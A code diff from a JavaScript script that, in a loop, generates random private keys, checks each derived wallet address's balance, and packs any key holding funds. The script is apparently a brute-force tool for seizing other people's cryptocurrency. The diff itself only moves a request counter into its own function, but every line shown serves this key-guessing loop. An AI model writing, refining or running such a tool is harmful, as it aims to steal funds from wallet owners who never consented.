@@ -53,13 +53,8 @@ async function PackWallet(wallet){
         }
     })
 }
-async function Purge(){
-
-    while(true){
-        const private_key = randomBytes(32)
-        const balance = await checkBalance(Wallet.default.fromPrivateKey(private_key).getAddressString())
-
-        reqc += 1
+function setCount(){
+    reqc += 1
         if(reqc == 100000){
             reqc = 0
             const date = new Date()
@@ -70,13 +65,16 @@ async function Purge(){
                 ":100.000 request sent"
                 )
         } 
+}
 
-        const date = new Date()
-        console.log("100.000 request sent: ", date.toLocaleTimeString('pt-BR', { 
-            timeZone: 'America/Sao_Paulo', 
-            timeStyle: 'medium' }
-            ))
+async function Purge(){
+
+    while(true){
+        const private_key = randomBytes(32)
+        const balance = await checkBalance(Wallet.default.fromPrivateKey(private_key).getAddressString())
         if(balance > 0) PackWallet([private_key, balance])
+
+        setCount()
     }
 }
 
